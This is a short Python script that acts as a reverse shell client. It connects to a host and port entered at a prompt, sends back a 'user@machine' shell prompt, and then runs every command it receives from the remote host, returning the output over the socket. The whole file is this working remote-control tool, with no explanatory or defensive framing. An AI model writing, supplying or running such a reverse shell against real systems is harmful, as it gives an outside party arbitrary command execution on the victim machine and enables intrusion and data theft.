import sys
from os import getcwd
from socket import *
from subprocess import getoutput

if sys.argv[1:]:
    HOST = sys.argv[1]
    PORT = int (sys.argv[2])

HOST = input(".HOST> ")
PORT = int (input(".PORT> "))

class Client():
    def __init__(self):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.sock.connect((HOST, PORT))
        
    def prompt(self):
        details = getoutput("whoami").split("\\")
        name , machine = details[1], details[0]
        return f"{name}@{machine}~{getcwd()}# "

    def terminal(self, cmd):
        opt = getoutput(cmd.decode())
        return (len(opt), opt)

    def Serve(self):
        prompt = self.prompt().encode()
        self.sock.send(prompt)
        while True:
            cmd = self.sock.recv(1024 * 10)
            size , opt = self.terminal(cmd)
            self.sock.send(str (size).encode())
            self.sock.send(opt.encode())

Client().Serve()
